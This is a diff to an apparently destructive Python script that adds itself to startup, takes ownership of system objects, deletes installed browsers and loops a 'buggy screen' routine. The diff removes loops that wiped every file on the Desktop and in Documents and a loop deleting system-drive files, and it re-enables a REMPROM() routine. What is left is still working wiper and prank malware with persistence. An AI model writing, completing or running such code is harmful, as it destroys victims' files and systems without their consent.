@@ -20,16 +20,6 @@ if result:
 else:
     print("Error setting ownership.")
 
-file_path = getDesktopPath()
-file_list = os.listdir(file_path)
-for file_name in file_list:
-    os.remove(os.path.join(file_path, file_name))
-
-file_path = getDocumentsPath()
-file_list = os.listdir(file_path)
-for file_name in file_list:
-    os.remove(os.path.join(file_path, file_name))
-
 
 default_disk = os.environ['SYSTEMDRIVE']
 objects.getAllUnifiedObjectsAndDelete() # Removing all browsers
@@ -46,9 +36,6 @@ def REMPROM():
     else:
         print("Error setting ownership.")
 
-    file_list = os.listdir(defaultdiskpath)
-    for file_name in file_list:
-        os.remove(os.path.join(file_path, file_name))
 
 def add_to_startup():
     file_path = os.path.abspath(__file__)
@@ -57,7 +44,7 @@ def add_to_startup():
 
 
 add_to_startup()
-# REMPROM() # Disabled to test if the function is provoking a bug.
+REMPROM()
 
 while True:
     makeBuggyScreen()
